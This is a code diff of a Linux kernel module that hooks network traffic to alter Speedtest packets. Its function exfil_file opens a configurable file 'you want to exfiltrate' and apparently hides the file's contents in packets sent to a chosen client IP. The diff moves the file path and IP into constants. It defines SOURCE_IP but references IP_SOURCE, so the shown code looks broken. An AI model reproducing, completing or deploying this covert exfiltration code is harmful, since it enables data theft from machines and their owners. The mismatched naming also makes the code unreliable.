@@ -29,7 +29,11 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Janessa Palmieri");
 MODULE_DESCRIPTION("Kernel module to modify Speedtest packets.");
 
-//const vars to skip OPTIONS and POST packets over port 8080
+//const vars to modify
+#define TEST_FILE "/path/to/file.txt"
+#define SOURCE_IP "192.168.X.X"
+
+//const vars to skip OPTIONS and POST packets over port 8080 seen with HTTP Speedtest servers
 #define SEARCH_STR_OPTIONS "OPTIONS"
 #define SEARCH_LEN_OPTIONS 7
 
@@ -51,7 +55,7 @@ static unsigned int exfil_file(struct sk_buff *skb, int offset) {
     ssize_t bytes_read;
 
     //Open the file
-    testfile = filp_open("/path/to/file.txt", O_RDONLY, 0); //change to the file you want to exfiltrate
+    testfile = filp_open(TEST_FILE, O_RDONLY, 0); //change to the file you want to exfiltrate
     if (IS_ERR(testfile)) {
         //pr_err("Failed to open file\n");
         return NF_ACCEPT;
@@ -111,7 +115,7 @@ static unsigned int hook_func(void *priv, struct sk_buff *skb, const struct nf_h
 
 	//convert source IP to bytes
 	__be32 source_ip;
-	char ip_source[] = "X.X.X.X";	//insert client IP here
+	char ip_source[] = IP_SOURCE;
 	__be32 client_ip = in_aton(ip_source);
 
 	//check if packet is valid
